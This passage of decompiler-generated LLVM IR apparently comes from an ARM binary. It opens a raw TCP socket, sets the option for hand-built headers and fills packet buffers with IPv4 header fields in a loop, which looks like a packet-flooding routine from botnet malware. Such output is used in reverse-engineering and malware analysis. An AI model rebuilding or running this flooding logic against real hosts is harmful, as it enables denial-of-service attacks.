  %v1_bc6c = urem i32 %v5_bc64, 256
  %v0_bc70 = load i32, i32* @r5, align 4
  store i32 %v0_bc70, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bc78 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_bc78, i32* %r3.global-to-local, align 4
  %v0_bc7c = load i32, i32* @r4, align 4
  store i32 %v0_bc7c, i32* %r0.global-to-local, align 4
  %v5_bc84 = inttoptr i32 %v0_bc70 to i32*
  %v6_bc84 = call i32 @function_ad24(i32 %v0_bc7c, i32* %v5_bc84, i32 18, i32 %v0_bc78)
  %v0_bc8c = load i32, i32* @r5, align 4
  store i32 %v0_bc8c, i32* %r1.global-to-local, align 4
  %v2_bc90 = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_bc90, i32* %r3.global-to-local, align 4
  store i32 %v6_bc84, i32* @r8, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_bc9c = load i32, i32* @r4, align 4
  store i32 %v0_bc9c, i32* %r0.global-to-local, align 4
  %v4_bca0 = inttoptr i32 %v0_bc8c to i32*
  %v5_bca0 = call i32 @function_ad24(i32 %v0_bc9c, i32* %v4_bca0, i32 24, i32 %v2_bc90)
  %v0_bca8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_bca8, i32* %r0.global-to-local, align 4
  %v1_bcac = inttoptr i32 %v0_bca8 to i32*
  %v2_bcac = call i32 @time(i32* %v1_bcac)
  %v1_bcb0 = load i32, i32* @r6, align 4
  %v2_bcb0 = add i32 %v1_bcb0, %v2_bcac
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bcc4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bcc4, i32* %r0.global-to-local, align 4
  %v7_bcc8 = icmp eq i32 %v3_bcc4, -1
  store i1 %v7_bcc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bcc8, label %dec_label_pc_c270, label %dec_label_pc_bcd4

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bb50
  store i32 1, i32* %stack_var_-40, align 4
  %v6_bcdc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_bcdc, i32* %r3.global-to-local, align 4
  %v0_bce4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_bce4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_bcf0 = call i32 @setsockopt(i32 %v3_bcc4, i32 %v0_bce4, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_bcf0, i32* %r0.global-to-local, align 4
  %v7_bcf4 = icmp eq i32 %v7_bcf0, -1
  store i1 %v7_bcf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bcf4, label %dec_label_pc_c278, label %dec_label_pc_bcfc

dec_label_pc_bcfc:                                ; preds = %dec_label_pc_bcd4
  %v0_bd08 = load i32, i32* @sl, align 4
  %v3_bd08 = mul i32 %v0_bd08, 65536
  store i32 %v3_bd08, i32* %sl.global-to-local, align 4
  %v0_bd0c = load i32, i32* @r7, align 4
  %v3_bd0c = mul i32 %v0_bd0c, 65536
  store i32 %v3_bd0c, i32* %r7.global-to-local, align 4
  %v2_bd14 = icmp eq i32 %v1_bb54, 0
  store i1 %v2_bd14, i1* %cpsr_z.global-to-local, align 1
  %v0_bd18 = load i32, i32* @r8, align 4
  %v1_bd18 = urem i32 %v0_bd18, 256
  store i32 %v1_bd18, i32* %r8.global-to-local, align 4
  %v3_bd1c = urem i32 %v0_bd0c, 65536
  store i32 %v3_bd1c, i32* %r3.global-to-local, align 4
  %v3_bd20 = urem i32 %v6_bc18, 65536
  store i32 %v3_bd20, i32* %r1.global-to-local, align 4
  %v3_bd24 = urem i32 %v0_bd08, 65536
  store i32 %v3_bd24, i32* %r2.global-to-local, align 4
  %v0_bd30 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_bd30, i32* %stack_var_-40, align 4
  br i1 %v2_bd14, label %dec_label_pc_bfb0.preheader, label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bcfc
  %v3_bd4c = mul i32 %v5_bc4c, 65536
  %v1_bd54 = urem i32 %v6_bc18, 256
  %v1_bd5c = add i32 %v3_bd4c, 524288
  %v1_bd60 = add i32 %v3_bd4c, 3407872
  %v1_bd64 = urem i32 %v0_bd08, 256
  %v1_bd68 = add i32 %v3_bd4c, 1835008
  %v0_bd0c.not = or i32 %v0_bd0c, -65536
  %v1_bd70 = xor i32 %v0_bd0c.not, 65535
  %v3_bd74 = udiv i32 %v1_bd68, 256
  %tmp78 = udiv i32 %v0_bd0c, 256
  %v1_bd88 = and i32 %v3_bd74, 65280
  store i32 %v1_bd88, i32* %r0.global-to-local, align 4
  %v3_bdac = mul nuw nsw i32 %v1_bd54, 256
  %tmp79 = udiv i32 %v6_bc18, 256
  %v4_bdb4 = urem i32 %tmp79, 256
  %v5_bdb4 = or i32 %v4_bdb4, %v3_bdac
  store i32 %v5_bdb4, i32* %lr.global-to-local, align 4
  %tmp80 = mul nsw i32 %v1_bd70, 256
  %v3_bdbc = mul nuw nsw i32 %v1_bd64, 256
  %sext24 = mul i32 %tmp78, 16777216
  %v4_bdc4 = sdiv i32 %sext24, 16777216
  %v4_bd8c = sdiv i32 %v1_bd60, 16777216
  %tmp81 = udiv i32 %v0_bd08, 256
  %v4_bdcc = urem i32 %tmp81, 256
  %v5_bdcc = or i32 %v4_bdcc, %v3_bdbc
  store i32 %v5_bdcc, i32* %r7.global-to-local, align 4
  %v1_bdd0 = and i32 %tmp80, 65280
  %v4_bdd4 = sdiv i32 %v1_bd68, 16777216
  %v3_bdd8 = udiv i32 %v1_bd5c, 256
  %tmp82 = udiv i32 %v1_bd70, 256
  %v4_bddc = urem i32 %tmp82, 256
  %v5_bddc = or i32 %v4_bddc, %v1_bdd0
  store i32 %v5_bddc, i32* %r6.global-to-local, align 4
  %v3_bde0 = ashr i32 %v1_bd60, 31
  %v3_bde4 = ashr i32 %sext24, 31
  %v1_bde8 = and i32 %v3_bdd8, 65280
  store i32 %v1_bde8, i32* %r5.global-to-local, align 4
  %v3_bdf4 = ashr i32 %v1_bd68, 31
  store i32 %v3_bdf4, i32* %r2.global-to-local, align 4
  %v3_bdf833 = udiv i32 %v1_bdd0, 256
  store i32 %v3_bdf833, i32* %r3.global-to-local, align 4
  store i32 %v1_bd54, i32* %r1.global-to-local, align 4
  %v4_be00 = udiv i32 %v1_bd5c, 16777216
  %v5_be00 = or i32 %v4_be00, %v1_bde8
  store i32 %v5_be00, i32* %r8.global-to-local, align 4
  %v5_be04 = trunc i32 %tmp82 to i8
  store i32 %v0_bd30, i32* %r4.global-to-local, align 4
  %v3_be1c34 = udiv i32 %v1_bde8, 256
  store i32 %v3_be1c34, i32* %sl.global-to-local, align 4
  store i32 %v1_bd64, i32* %fp.global-to-local, align 4
  %v4_be70 = sext i8 %v5_bbf0 to i32
  %sext16 = mul i32 %v1_bd70, 16777216
  %v4_bf2c = sdiv i32 %sext16, 16777216
  %v2_bf5c = icmp eq i32 %v1_bd18, 0
  %sext17 = mul i32 %v6_bc18, 16777216
  %v4_bf70 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %tmp79, 16777216
  %v4_bf8c = sdiv i32 %sext18, 16777216
  %v1_be88 = trunc i32 %v4_bdc4 to i8
  br label %dec_label_pc_be24

dec_label_pc_be24:                                ; preds = %bb93, %dec_label_pc_bd44
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_be30 = call i32* @calloc(i32 1510, i32 4)
  %v4_be30 = ptrtoint i32* %v2_be30 to i32
  store i32 %v4_be30, i32* %r0.global-to-local, align 4
  store i32 %v4_bb80, i32* %r2.global-to-local, align 4
  %v3_be38 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_be38, i32* %r3.global-to-local, align 4
  %v2_be3c = load i32, i32* %r4.global-to-local, align 4
  %v5_be3c = mul i32 %v2_be3c, 4
  %v6_be3c = add i32 %v5_be3c, %v4_bb80
  %v7_be3c = inttoptr i32 %v6_be3c to i32*
  store i32 %v4_be30, i32* %v7_be3c, align 4
  %v0_be40 = load i32, i32* %r2.global-to-local, align 4
  %v1_be40 = load i32, i32* %r3.global-to-local, align 4
  %v4_be40 = mul i32 %v1_be40, 4
  %v5_be40 = add i32 %v4_be40, %v0_be40
  %v6_be40 = inttoptr i32 %v5_be40 to i32*
  %v7_be40 = load i32, i32* %v6_be40, align 4
  store i32 %v7_be40, i32* %r4.global-to-local, align 4
  %v1_be44 = inttoptr i32 %v7_be40 to i8*
  %v2_be44 = load i8, i8* %v1_be44, align 1
  %tmp = urem i8 %v2_be44, 16
  %v1_be48 = zext i8 %tmp to i32
  %v1_be4c = or i32 %v1_be48, 64
  store i32 %v1_be4c, i32* %r2.global-to-local, align 4
  %v1_be50 = trunc i32 %v1_be4c to i8
  store i8 %v1_be50, i8* %v1_be44, align 1
  %v0_be54 = load i32, i32* %r4.global-to-local, align 4
  %v1_be54 = inttoptr i32 %v0_be54 to i8*
  %v2_be54 = load i8, i8* %v1_be54, align 1
  %v1_be58 = and i8 %v2_be54, -16
  %v1_be5c = or i8 %v1_be58, 5
  store i32 %v1_bc00, i32* %r1.global-to-local, align 4
  store i8 %v1_be5c, i8* %v1_be54, align 1
  %v2_be6c = load i32, i32* %r4.global-to-local, align 4
  %v3_be6c = add i32 %v2_be6c, 1
  %v4_be6c = inttoptr i32 %v3_be6c to i8*
  store i8 %v5_bbb8, i8* %v4_be6c, align 1
  %v2_be74 = load i32, i32* %r4.global-to-local, align 4
  %v3_be74 = add i32 %v2_be74, 8
  %v4_be74 = inttoptr i32 %v3_be74 to i8*
  store i8 %v5_bbf0, i8* %v4_be74, align 1
  store i32 %v4_bdc4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_be80 = load i32, i32* %r1.global-to-local, align 4
  %v9_be80 = icmp eq i32 %v0_be80, 0
  store i1 %v9_be80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_bde0, i32* %r2.global-to-local, align 4
  %v2_be88 = load i32, i32* %r4.global-to-local, align 4
  %v3_be88 = add i32 %v2_be88, 4
  %v4_be88 = inttoptr i32 %v3_be88 to i8*
  store i8 %v1_be88, i8* %v4_be88, align 1
  store i32 %v4_bd8c, i32* %r1.global-to-local, align 4
  %v0_be90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be90, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be24
  %v1_be90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_be90, i32* %r3.global-to-local, align 4
  %v2_be94 = trunc i32 %v1_be90 to i8
  %v3_be94 = load i32, i32* %r4.global-to-local, align 4
  %v4_be94 = add i32 %v3_be94, 7
  %v5_be94 = inttoptr i32 %v4_be94 to i8*
  store i8 %v2_be94, i8* %v5_be94, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be24, %bb
  store i32 47, i32* %r3.global-to-local, align 4
  %v0_be9c = load i32, i32* %r2.global-to-local, align 4
  %v1_be9c = trunc i32 %v0_be9c to i8
  %v2_be9c = load i32, i32* %r4.global-to-local, align 4
  %v3_be9c = add i32 %v2_be9c, 3
  %v4_be9c = inttoptr i32 %v3_be9c to i8*
  store i8 %v1_be9c, i8* %v4_be9c, align 1
  %v0_bea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bea0 = trunc i32 %v0_bea0 to i8
  %v2_bea0 = load i32, i32* %r4.global-to-local, align 4
  %v3_bea0 = add i32 %v2_bea0, 2
  %v4_bea0 = inttoptr i32 %v3_bea0 to i8*
  store i8 %v1_bea0, i8* %v4_bea0, align 1
  %v0_bea4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bea4, label %bb84, label %bb83

bb83:                                             ; preds = %.thread
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %.thread, %bb83
  store i32 %v3_bde4, i32* %r1.global-to-local, align 4
  %v0_beac = load i32, i32* %r3.global-to-local, align 4
  %v1_beac = trunc i32 %v0_beac to i8
  %v2_beac = load i32, i32* %r4.global-to-local, align 4
  %v3_beac = add i32 %v2_beac, 9
  %v4_beac = inttoptr i32 %v3_beac to i8*
  store i8 %v1_beac, i8* %v4_beac, align 1
  %v0_beb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_beb0, label %bb86, label %bb85

bb85:                                             ; preds = %bb84
  %v1_beb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_beb0 = trunc i32 %v1_beb0 to i8
  %v3_beb0 = load i32, i32* %r4.global-to-local, align 4
  %v4_beb0 = add i32 %v3_beb0, 6
  %v5_beb0 = inttoptr i32 %v4_beb0 to i8*
  store i8 %v2_beb0, i8* %v5_beb0, align 1
  br label %bb86

bb86:                                             ; preds = %bb84, %bb85
  %v3_beb4 = load i32, i32* %stack_var_-40, align 4
  %v5_bebc = mul i32 %v3_beb4, 24
  store i32 %v5_bebc, i32* %r3.global-to-local, align 4
  store i32 %v5_bca0, i32* %r2.global-to-local, align 4
  %v1_bec4 = load i32, i32* %r4.global-to-local, align 4
  %v2_bec4 = add i32 %v1_bec4, 12
  %v3_bec4 = inttoptr i32 %v2_bec4 to i32*
  store i32 %v5_bca0, i32* %v3_bec4, align 4
  %v0_bec8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bec8 = load i32, i32* @sb, align 4
  %v2_bec8 = add i32 %v1_bec8, %v0_bec8
  store i32 %v2_bec8, i32* %r3.global-to-local, align 4
  %v0_becc = load i32, i32* %r1.global-to-local, align 4
  %v1_becc = trunc i32 %v0_becc to i8
  %v2_becc = load i32, i32* %r4.global-to-local, align 4
  %v3_becc = add i32 %v2_becc, 5
  %v4_becc = inttoptr i32 %v3_becc to i8*
  store i8 %v1_becc, i8* %v4_becc, align 1
  %v0_bed0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bed0 = add i32 %v0_bed0, 16
  %v2_bed0 = inttoptr i32 %v1_bed0 to i32*
  %v3_bed0 = load i32, i32* %v2_bed0, align 4
  store i32 %v3_bed0, i32* %r2.global-to-local, align 4
  %v0_bed4 = load i32, i32* %r4.global-to-local, align 4
  %v1_bed4 = add i32 %v0_bed4, 20
  store i32 %v1_bed4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_bedc = load i32, i32* %r0.global-to-local, align 4
  %v1_bedc = trunc i32 %v0_bedc to i8
  %v3_bedc = add i32 %v0_bed4, 23
  %v4_bedc = inttoptr i32 %v3_bedc to i8*
  store i8 %v1_bedc, i8* %v4_bedc, align 1
  %v0_bee0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bee0 = trunc i32 %v0_bee0 to i8
  %v2_bee0 = load i32, i32* %r1.global-to-local, align 4
  %v3_bee0 = add i32 %v2_bee0, 2
  %v4_bee0 = inttoptr i32 %v3_bee0 to i8*
  store i8 %v1_bee0, i8* %v4_bee0, align 1
  %v0_bee4 = load i32, i32* %r4.global-to-local, align 4
  %v1_bee4 = add i32 %v0_bee4, 24
  %v2_bee4 = inttoptr i32 %v1_bee4 to i8*
  %v3_bee4 = load i8, i8* %v2_bee4, align 1
  %tmp99 = urem i8 %v3_bee4, 16
  %v1_bee8 = zext i8 %tmp99 to i32
  %v1_beec = or i32 %v1_bee8, 64
  store i32 %v1_beec, i32* %r3.global-to-local, align 4
  %v1_bef0 = trunc i32 %v1_beec to i8
  store i8 %v1_bef0, i8* %v2_bee4, align 1
  %v0_bef4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bef4 = load i32, i32* %r4.global-to-local, align 4
  %v2_bef4 = add i32 %v1_bef4, 16
  %v3_bef4 = inttoptr i32 %v2_bef4 to i32*
  store i32 %v0_bef4, i32* %v3_bef4, align 4
  %v0_bef8 = load i32, i32* %r4.global-to-local, align 4
  %v1_bef8 = add i32 %v0_bef8, 24
  %v2_bef8 = inttoptr i32 %v1_bef8 to i8*
  %v3_bef8 = load i8, i8* %v2_bef8, align 1
  %v1_befc = and i8 %v3_bef8, -16
  %v1_bf00 = or i8 %v1_befc, 5
  store i8 %v1_bf00, i8* %v2_bef8, align 1
  %v0_bf0c = load i32, i32* %r4.global-to-local, align 4
  %v1_bf0c = add i32 %v0_bf0c, 24
  store i32 %v1_bf0c, i32* %r5.global-to-local, align 4
  %v3_bf10 = add i32 %v0_bf0c, 25
  %v4_bf10 = inttoptr i32 %v3_bf10 to i8*
  store i8 %v5_bbb8, i8* %v4_bf10, align 1
  store i32 %v4_bdd4, i32* %r1.global-to-local, align 4
  store i32 %tmp82, i32* %r3.global-to-local, align 4
  store i32 %v3_bdf4, i32* %r2.global-to-local, align 4
  %v2_bf20 = load i32, i32* %r5.global-to-local, align 4
  %v3_bf20 = add i32 %v2_bf20, 4
  %v4_bf20 = inttoptr i32 %v3_bf20 to i8*
  store i8 %v5_be04, i8* %v4_bf20, align 1
  %v0_bf24 = load i32, i32* %r1.global-to-local, align 4
  %v1_bf24 = trunc i32 %v0_bf24 to i8
  %v2_bf24 = load i32, i32* %r5.global-to-local, align 4
  %v3_bf24 = add i32 %v2_bf24, 2
  %v4_bf24 = inttoptr i32 %v3_bf24 to i8*
  store i8 %v1_bf24, i8* %v4_bf24, align 1
  %v0_bf28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf28, label %bb88, label %bb87

bb87:                                             ; preds = %bb86
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb88

bb88:                                             ; preds = %bb86, %bb87
  store i32 %v4_bf2c, i32* %r1.global-to-local, align 4
  %v0_bf30 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf30 = trunc i32 %v0_bf30 to i8
  %v2_bf30 = load i32, i32* %r5.global-to-local, align 4
  %v3_bf30 = add i32 %v2_bf30, 3
  %v4_bf30 = inttoptr i32 %v3_bf30 to i8*
  store i8 %v1_bf30, i8* %v4_bf30, align 1
  store i32 %v4_be70, i32* %r2.global-to-local, align 4
  %v0_bf38 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf38, label %bb90, label %bb89

bb89:                                             ; preds = %bb88
  %v1_bf38 = load i32, i32* %r3.global-to-local, align 4
  %v2_bf38 = trunc i32 %v1_bf38 to i8
  %v3_bf38 = load i32, i32* %r5.global-to-local, align 4
  %v4_bf38 = add i32 %v3_bf38, 6
  %v5_bf38 = inttoptr i32 %v4_bf38 to i8*
  store i8 %v2_bf38, i8* %v5_bf38, align 1
  br label %bb90

bb90:                                             ; preds = %bb88, %bb89
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_bf40 = load i32, i32* %r1.global-to-local, align 4
  %v1_bf40 = trunc i32 %v0_bf40 to i8
  %v2_bf40 = load i32, i32* %r5.global-to-local, align 4
  %v3_bf40 = add i32 %v2_bf40, 5
  %v4_bf40 = inttoptr i32 %v3_bf40 to i8*
  store i8 %v1_bf40, i8* %v4_bf40, align 1
  %v0_bf44 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf44 = trunc i32 %v0_bf44 to i8
  %v2_bf44 = load i32, i32* %r5.global-to-local, align 4
  %v3_bf44 = add i32 %v2_bf44, 8
  %v4_bf44 = inttoptr i32 %v3_bf44 to i8*
  store i8 %v1_bf44, i8* %v4_bf44, align 1
  %v0_bf48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf48, label %bb92, label %bb91

bb91:                                             ; preds = %bb90
  %v1_bf48 = load i32, i32* %r0.global-to-local, align 4
  %v2_bf48 = trunc i32 %v1_bf48 to i8
  %v3_bf48 = load i32, i32* %r5.global-to-local, align 4
  %v4_bf48 = add i32 %v3_bf48, 7
  %v5_bf48 = inttoptr i32 %v4_bf48 to i8*
  store i8 %v2_bf48, i8* %v5_bf48, align 1
  br label %bb92

bb92:                                             ; preds = %bb90, %bb91
  %v0_bf4c = load i32, i32* %r3.global-to-local, align 4
  %v1_bf4c = trunc i32 %v0_bf4c to i8
  %v2_bf4c = load i32, i32* %r5.global-to-local, align 4
  %v3_bf4c = add i32 %v2_bf4c, 9
  %v4_bf4c = inttoptr i32 %v3_bf4c to i8*
  store i8 %v1_bf4c, i8* %v4_bf4c, align 1
  %v0_bf50 = call i32 @function_105b0()
  store i32 %v0_bf50, i32* %r0.global-to-local, align 4
  store i32 %v1_bd18, i32* %r1.global-to-local, align 4
  store i1 %v2_bf5c, i1* %cpsr_z.global-to-local, align 1
  %v1_bf60 = sub i32 1023, %v0_bf50
  store i32 %v1_bf60, i32* %r3.global-to-local, align 4
  br i1 %v2_bf5c, label %.thread19, label %.thread20

.thread19:                                        ; preds = %bb92
  %v2_bf68 = load i32, i32* %r5.global-to-local, align 4
  %v3_bf68 = add i32 %v2_bf68, 16
  %v4_bf68 = inttoptr i32 %v3_bf68 to i32*
  store i32 %v1_bf60, i32* %v4_bf68, align 4
  br label %bb93

.thread20:                                        ; preds = %bb92
  %v1_bf64 = load i32, i32* %r4.global-to-local, align 4
  %v2_bf64 = add i32 %v1_bf64, 16
  %v3_bf64 = inttoptr i32 %v2_bf64 to i32*
  %v4_bf64 = load i32, i32* %v3_bf64, align 4
  store i32 %v4_bf64, i32* %r3.global-to-local, align 4
  %v2_bf6c = load i32, i32* %r5.global-to-local, align 4
  %v3_bf6c = add i32 %v2_bf6c, 16
  %v4_bf6c = inttoptr i32 %v3_bf6c to i32*
  store i32 %v4_bf64, i32* %v4_bf6c, align 4
  br label %bb93

bb93:                                             ; preds = %.thread19, %.thread20
  store i32 %v4_bf70, i32* %r3.global-to-local, align 4
  %v0_bf74 = load i32, i32* %r4.global-to-local, align 4
  %v1_bf74 = add i32 %v0_bf74, 44
  store i32 %v1_bf74, i32* %r6.global-to-local, align 4
  %v1_bf78 = load i32, i32* %r5.global-to-local, align 4
  %v2_bf78 = add i32 %v1_bf78, 12
  %v3_bf78 = inttoptr i32 %v2_bf78 to i32*
  store i32 %v0_bf50, i32* %v3_bf78, align 4
  %v0_bf7c = load i32, i32* %r3.global-to-local, align 4
  %v1_bf7c = trunc i32 %v0_bf7c to i8
  %v2_bf7c = load i32, i32* %r6.global-to-local, align 4
  %v3_bf7c = add i32 %v2_bf7c, 1
  %v4_bf7c = inttoptr i32 %v3_bf7c to i8*
  store i8 %v1_bf7c, i8* %v4_bf7c, align 1
  %v3_bf80 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bf80, i32* %r3.global-to-local, align 4
  store i32 %v1_bb54, i32* %r1.global-to-local, align 4
  %v1_bf88 = add i32 %v3_bf80, 1
  store i32 %v1_bf88, i32* %r4.global-to-local, align 4
  store i32 %v4_bf8c, i32* %r2.global-to-local, align 4
  %v9_bf90 = icmp eq i32 %v1_bf88, %v1_bb54
  store i1 %v9_bf90, i1* %cpsr_z.global-to-local, align 1
  %v0_bf94 = load i32, i32* %sl.global-to-local, align 4
  %v1_bf94 = trunc i32 %v0_bf94 to i8
  %v2_bf94 = load i32, i32* %r6.global-to-local, align 4
  %v3_bf94 = add i32 %v2_bf94, 5
  %v4_bf94 = inttoptr i32 %v3_bf94 to i8*
  store i8 %v1_bf94, i8* %v4_bf94, align 1
  %v0_bf98 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf98 = trunc i32 %v0_bf98 to i8
  %v2_bf98 = load i32, i32* %r6.global-to-local, align 4
  %v3_bf98 = inttoptr i32 %v2_bf98 to i8*
  store i8 %v1_bf98, i8* %v3_bf98, align 1
  %v0_bf9c = load i32, i32* %r7.global-to-local, align 4
  %v1_bf9c = trunc i32 %v0_bf9c to i8
  %v2_bf9c = load i32, i32* %r6.global-to-local, align 4
  %v3_bf9c = add i32 %v2_bf9c, 2
  %v4_bf9c = inttoptr i32 %v3_bf9c to i8*
  store i8 %v1_bf9c, i8* %v4_bf9c, align 1
  %v0_bfa0 = load i32, i32* %fp.global-to-local, align 4
  %v1_bfa0 = trunc i32 %v0_bfa0 to i8
  %v2_bfa0 = load i32, i32* %r6.global-to-local, align 4
  %v3_bfa0 = add i32 %v2_bfa0, 3
  %v4_bfa0 = inttoptr i32 %v3_bfa0 to i8*
  store i8 %v1_bfa0, i8* %v4_bfa0, align 1
  %v0_bfa4 = load i32, i32* %r8.global-to-local, align 4
  %v1_bfa4 = trunc i32 %v0_bfa4 to i8
  %v2_bfa4 = load i32, i32* %r6.global-to-local, align 4
  %v3_bfa4 = add i32 %v2_bfa4, 4
  %v4_bfa4 = inttoptr i32 %v3_bfa4 to i8*
  store i8 %v1_bfa4, i8* %v4_bfa4, align 1
  %v0_bfa8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bfa8, i32* %stack_var_-40, align 4
  %v5_bfac = icmp slt i32 %v1_bf88, %v1_bb54
  br i1 %v5_bfac, label %dec_label_pc_be24, label %dec_label_pc_bfb0.preheader

dec_label_pc_bfb0.preheader:                      ; preds = %bb93, %dec_label_pc_bcfc
  %v1_bfd0 = add i32 %v5_bc4c, 8
  %v1_bfd4 = add i32 %v5_bc4c, 52
  %v2_bfe0 = icmp eq i32 %v5_bca0, -1
  %v7_bfe0 = icmp eq i32 %v5_bca0, -1
  %v9_c1a8 = icmp eq i32 %v3_bd1c, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  %v2_c218 = icmp eq i32 %v1_bd18, 0
  %v2_c234 = icmp eq i32 %v1_bc6c, 0
  br label %dec_label_pc_bfb0

dec_label_pc_bfb0:                                ; preds = %dec_label_pc_bfb0.preheader, %dec_label_pc_c25c
  store i32 %v1_bb54, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_bd14, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_bd14, label %dec_label_pc_c25c, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bfb0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_bc4c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v1_bfd0, i32* @fp, align 4
  store i32 %v1_bfd4, i32* @sl, align 4
  br label %dec_label_pc_c108

dec_label_pc_bfdc:                                ; preds = %dec_label_pc_c108
  store i32 %v5_bca0, i32* %r2.global-to-local, align 4
  store i1 %v7_bfe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bfe0, label %dec_label_pc_c198, label %dec_label_pc_bfe8

dec_label_pc_bfe8:                                ; preds = %dec_label_pc_c130, %dec_label_pc_bfdc
  store i32 %v3_bd1c, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_c1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c1a8, label %dec_label_pc_c1b4, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_c198.dec_label_pc_bffc_crit_edge, %dec_label_pc_bfe8
  %v1_c000 = phi i32 [ %v1_c000.pre, %dec_label_pc_c198.dec_label_pc_bffc_crit_edge ], [ add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), %dec_label_pc_bfe8 ]
  store i32 %v3_bd20, i32* %r1.global-to-local, align 4
  %v9_c000 = icmp eq i32 %v3_bd20, %v1_c000
  store i1 %v9_c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c000, label %dec_label_pc_c1ec, label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_c1b4.dec_label_pc_c008_crit_edge, %dec_label_pc_bffc
  %v1_c00c = phi i32 [ %v1_c00c.pre, %dec_label_pc_c1b4.dec_label_pc_c008_crit_edge ], [ %v1_c000, %dec_label_pc_bffc ]
  store i32 %v3_bd24, i32* %r2.global-to-local, align 4
  %v9_c00c = icmp eq i32 %v3_bd24, %v1_c00c
  store i1 %v9_c00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c00c, label %dec_label_pc_c208, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_c1ec, %dec_label_pc_c008
  store i32 %v1_bd18, i32* %r3.global-to-local, align 4
  store i1 %v2_c218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c218, label %dec_label_pc_c22c, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_c014
  %v1_c01c = load i32, i32* @r5, align 4
  %v2_c01c = add i32 %v1_c01c, 16
  %v3_c01c = inttoptr i32 %v2_c01c to i32*
  %v4_c01c = load i32, i32* %v3_c01c, align 4
  store i32 %v4_c01c, i32* %r3.global-to-local, align 4
  %v2_c020 = load i32, i32* @r6, align 4
  %v3_c020 = add i32 %v2_c020, 16
  %v4_c020 = inttoptr i32 %v3_c020 to i32*
  store i32 %v4_c01c, i32* %v4_c020, align 4
  br label %dec_label_pc_c028

dec_label_pc_c028:                                ; preds = %bb98, %.thread21
  store i32 %v1_bc6c, i32* %r1.global-to-local, align 4
  store i1 %v2_c234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c234, label %dec_label_pc_c034, label %dec_label_pc_c240

dec_label_pc_c034:                                ; preds = %dec_label_pc_c028, %dec_label_pc_c22c, %dec_label_pc_c240
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c038 = load i32, i32* @r8, align 4
  %v1_c038 = trunc i32 %v0_c038 to i8
  %v2_c038 = load i32, i32* @r5, align 4
  %v3_c038 = add i32 %v2_c038, 10
  %v4_c038 = inttoptr i32 %v3_c038 to i8*
